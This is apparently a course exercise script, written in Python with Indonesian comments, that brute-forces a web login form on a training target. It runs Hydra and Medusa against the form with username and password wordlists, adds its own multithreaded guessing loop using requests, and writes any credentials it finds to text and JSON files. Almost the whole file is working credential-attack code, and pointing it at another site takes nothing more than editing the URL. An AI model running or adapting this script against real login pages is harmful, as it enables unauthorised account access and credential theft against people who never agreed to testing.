#!/usr/bin/env python3
"""
Live Password Cracker - Dengan Fix Hydra & Medusa Path
Module 2: Threat Modelling
Author: Yoga Arfiyanto
"""

import requests
import threading
import queue
import subprocess
import time
import os
import sys
import json
import urllib3
from bs4 import BeautifulSoup
from datetime import datetime
from colorama import init, Fore, Style

# Nonaktifkan SSL warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Tambahkan path module
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))

try:
    from modules.form_analyzer import FormAnalyzer
    from modules.result_saver import ResultSaver
    from modules.logger import get_logger
except ImportError:
    FormAnalyzer = None
    ResultSaver = None
    get_logger = None

init(autoreset=True)

class LiveCracker:
    """Live Password Cracker dengan multiple tools"""
    
    def __init__(self):
        self.target_url = "https://target.rootbrain.com/web101/FormCracking/index.php"
        self.username_file = os.path.join(os.path.dirname(__file__), '..', 'wordlists', 'username.txt')
        self.password_file = os.path.join(os.path.dirname(__file__), '..', 'wordlists', 'passwords.txt')
        self.successful_logins = []
        
        # Buat session dengan SSL verification disabled
        self.session = requests.Session()
        self.session.verify = False
        
        # Daftar path umum untuk tools
        self.common_paths = [
            '/usr/bin',
            '/usr/local/bin',
            '/bin',
            '/sbin',
            '/opt/bin'
        ]
        
        if FormAnalyzer:
            self.analyzer = FormAnalyzer(self.target_url)
        else:
            self.analyzer = None
            
        if ResultSaver:
            self.saver = ResultSaver("live_cracking")
        else:
            self.saver = None
    
    def find_tool(self, tool_name):
        """Mencari lokasi tool di berbagai path"""
        for base_path in self.common_paths:
            tool_path = os.path.join(base_path, tool_name)
            if os.path.exists(tool_path):
                return tool_path
        return None
    
    def banner(self):
        print(Fore.RED + """
╔══════════════════════════════════════════════════════════╗
║                LIVE PASSWORD CRACKER                      ║
║       Hydra | Medusa | Python Multithreading             ║
╚══════════════════════════════════════════════════════════╝
        """)
    
    def download_wordlists(self):
        """Download username dan password dari target"""
        print(Fore.YELLOW + "\n[STEP 1] Mendownload wordlists...")
        
        # Cek apakah file sudah ada
        if os.path.exists(self.username_file) and os.path.exists(self.password_file):
            print(Fore.GREEN + "  ✓ Wordlists sudah ada, menggunakan file lokal")
            try:
                with open(self.username_file, 'r') as f:
                    username_count = len(f.readlines())
                with open(self.password_file, 'r') as f:
                    password_count = len(f.readlines())
                print(Fore.WHITE + f"    Username: {username_count} entries")
                print(Fore.WHITE + f"    Password: {password_count} entries")
                return True
            except:
                pass
        return True
    
    def analyze_form(self):
        """Analisis form login"""
        print(Fore.YELLOW + "\n[STEP 2] Menganalisis form target...")
        
        try:
            response = self.session.get(self.target_url, timeout=10)
            
            if response.status_code != 200:
                print(Fore.RED + f"  ✗ HTTP Error: {response.status_code}")
                return self._get_default_form()
                
            soup = BeautifulSoup(response.text, 'html.parser')
            
            form = soup.find('form')
            if form:
                fields = []
                for input_tag in form.find_all('input'):
                    if input_tag.get('name'):
                        fields.append(input_tag.get('name'))
                
                form_info = {
                    'method': form.get('method', 'post').upper(),
                    'action': form.get('action', self.target_url),
                    'fields': fields,
                    'error': 'Invalid username or password'
                }
                
                print(Fore.GREEN + "  ✓ Form ditemukan:")
                print(Fore.WHITE + f"    Method : {form_info['method']}")
                print(Fore.WHITE + f"    Action : {form_info['action']}")
                print(Fore.WHITE + f"    Fields : {', '.join(form_info['fields'])}")
                
                return form_info
            else:
                print(Fore.YELLOW + "  ⚠ Form tidak ditemukan, menggunakan default")
                return self._get_default_form()
                
        except Exception as e:
            print(Fore.RED + f"  ✗ Error: {e}")
            return self._get_default_form()
    
    def _get_default_form(self):
        return {
            'method': 'POST',
            'action': self.target_url,
            'fields': ['username', 'password'],
            'error': 'Invalid username or password'
        }
    
    def method_hydra(self):
        """Method 1: Hydra - DENGAN PENCARIAN PATH"""
        print(Fore.YELLOW + "\n[Method 1] Menggunakan Hydra...")
        
        # Cari lokasi hydra
        hydra_path = self.find_tool('hydra')
        
        if not hydra_path:
            print(Fore.RED + "  ✗ Hydra tidak ditemukan.")
            print(Fore.YELLOW + "    Install dengan: sudo apt install hydra")
            print(Fore.YELLOW + "    Atau jalankan manual: hydra [options]")
            return
        
        print(Fore.GREEN + f"  ✓ Hydra ditemukan di: {hydra_path}")
        
        # Format hydra command
        cmd = [
            hydra_path,
            "-L", self.username_file,
            "-P", self.password_file,
            "target.rootbrain.com",
            "http-post-form",
            "/web101/FormCracking/index.php:username=^USER^&password=^PASS^&Login=Login:Invalid username or password",
            "-t", "4",
            "-f",
            "-V"  # verbose
        ]
        
        cmd_str = ' '.join(cmd)
        print(Fore.BLUE + f"  Menjalankan: {cmd_str}")
        
        try:
            start_time = time.time()
            result = subprocess.run(cmd_str, shell=True, capture_output=True, text=True, timeout=60)
            elapsed = time.time() - start_time
            
            output = result.stdout + result.stderr
            print(Fore.WHITE + output[-500:])  # Tampilkan 500 karakter terakhir
            
            # Cari pattern login berhasil
            import re
            pattern = r'login:\s*(\S+)\s*password:\s*(\S+)'
            matches = re.findall(pattern, output, re.IGNORECASE)
            
            if matches:
                for username, password in matches:
                    print(Fore.GREEN + f"\n  ✅ HYDRA FOUND: {username}:{password}")
                    self.successful_logins.append({
                        'method': 'hydra',
                        'username': username,
                        'password': password,
                        'time': round(elapsed, 2)
                    })
            else:
                print(Fore.YELLOW + "  Tidak menemukan kredensial valid dengan Hydra")
                
        except subprocess.TimeoutExpired:
            print(Fore.RED + "  Hydra timeout (60 detik)")
        except Exception as e:
            print(Fore.RED + f"  Error: {e}")
    
    def method_medusa(self):
        """Method 2: Medusa - DENGAN PENCARIAN PATH"""
        print(Fore.YELLOW + "\n[Method 2] Menggunakan Medusa...")
        
        # Cari lokasi medusa
        medusa_path = self.find_tool('medusa')
        
        if not medusa_path:
            print(Fore.RED + "  ✗ Medusa tidak ditemukan.")
            print(Fore.YELLOW + "    Install dengan: sudo apt install medusa")
            return
        
        print(Fore.GREEN + f"  ✓ Medusa ditemukan di: {medusa_path}")
        
        try:
            start_time = time.time()
            result = subprocess.run(
                [medusa_path, '-h', 'target.rootbrain.com', 
                 '-U', self.username_file, 
                 '-P', self.password_file, 
                 '-M', 'http', 
                 '-m', 'POST:/web101/FormCracking/index.php',
                 '-m', 'FORM:username=user&password=pass&Login=Login', 
                 '-f', '-t', '5'],
                capture_output=True, text=True, timeout=60
            )
            elapsed = time.time() - start_time
            
            output = result.stdout + result.stderr
            
            if "ACCOUNT FOUND" in output or "SUCCESS" in output.upper():
                print(Fore.GREEN + f"\n  ✅ MEDUSA menemukan kredensial!")
                print(Fore.WHITE + output)
                
        except subprocess.TimeoutExpired:
            print(Fore.RED + "  Medusa timeout (60 detik)")
        except Exception as e:
            print(Fore.RED + f"  Error: {e}")
    
    def method_python(self):
        """Method 3: Python Multithreading"""
        print(Fore.YELLOW + "\n[Method 3] Python Multithread Cracker...")
        
        try:
            with open(self.username_file, 'r') as f:
                usernames = [line.strip() for line in f if line.strip()]
            with open(self.password_file, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(Fore.RED + f"  Error membaca wordlists: {e}")
            return
        
        # Batasi untuk testing
        usernames = usernames[:10]
        passwords = passwords[:20]
        
        total_combos = len(usernames) * len(passwords)
        print(Fore.BLUE + f"  Total kombinasi: {total_combos}")
        
        q = queue.Queue()
        for username in usernames:
            for password in passwords:
                q.put((username, password))
        
        lock = threading.Lock()
        found = False
        attempts = 0
        start_time = time.time()
        
        def worker():
            nonlocal attempts, found
            session = requests.Session()
            session.verify = False
            
            while not q.empty() and not found:
                try:
                    username, password = q.get_nowait()
                    
                    with lock:
                        attempts += 1
                        if attempts % 10 == 0:
                            elapsed = time.time() - start_time
                            print(Fore.WHITE + f"    Progress: {attempts}/{total_combos}")
                    
                    data = {
                        'username': username,
                        'password': password,
                        'Login': 'Login'
                    }
                    
                    response = session.post(self.target_url, data=data, timeout=5)
                    
                    if "Invalid" not in response.text and "Wrong" not in response.text:
                        with lock:
                            elapsed = time.time() - start_time
                            print(Fore.GREEN + f"\n  ✅ PYTHON FOUND: {username}:{password}")
                            print(Fore.GREEN + f"     Waktu: {elapsed:.1f} detik")
                            
                            self.successful_logins.append({
                                'method': 'python',
                                'username': username,
                                'password': password,
                                'time': round(elapsed, 2)
                            })
                            
                            found = True
                            
                except queue.Empty:
                    break
                except:
                    continue
        
        threads = []
        for _ in range(5):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join(timeout=30)
    
    def run(self):
        """Jalankan semua metode"""
        self.banner()
        
        self.download_wordlists()
        self.analyze_form()
        
        self.method_hydra()
        self.method_medusa()
        self.method_python()
        
        self.show_results()
    
    def show_results(self):
        """Tampilkan hasil"""
        if not self.successful_logins:
            print(Fore.RED + "\n✗ Tidak ada kredensial valid yang ditemukan")
            return
        
        print(Fore.GREEN + f"""
╔══════════════════════════════════════════════════════════╗
║         KREDENSIAL VALID DITEMUKAN ({len(self.successful_logins)})      ║
╚══════════════════════════════════════════════════════════╝
        """)
        
        for i, cred in enumerate(self.successful_logins, 1):
            print(Fore.WHITE + f"  {i}. {cred['username']}:{cred['password']}")
            print(Fore.WHITE + f"     Method: {cred['method']}, Waktu: {cred['time']:.1f}s")
        
        # Simpan hasil
        results_dir = os.path.join(os.path.dirname(__file__), '..', 'results', 'live_cracking')
        os.makedirs(results_dir, exist_ok=True)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        txt_file = os.path.join(results_dir, f'valid_credentials_{timestamp}.txt')
        with open(txt_file, 'w') as f:
            f.write(f"VALID CREDENTIALS - {datetime.now()}\n")
            f.write("="*50 + "\n\n")
            for cred in self.successful_logins:
                f.write(f"Username: {cred['username']}\n")
                f.write(f"Password: {cred['password']}\n")
                f.write(f"Method: {cred['method']}\n")
                f.write(f"Time: {cred['time']}s\n")
                f.write("-"*30 + "\n")
        
        print(Fore.GREEN + f"\n✓ Hasil disimpan di {txt_file}")
        
        json_file = os.path.join(results_dir, f'results_{timestamp}.json')
        with open(json_file, 'w') as f:
            json.dump(self.successful_logins, f, indent=4)
        print(Fore.GREEN + f"✓ JSON saved: {json_file}")

if __name__ == "__main__":
    cracker = LiveCracker()
    cracker.run()
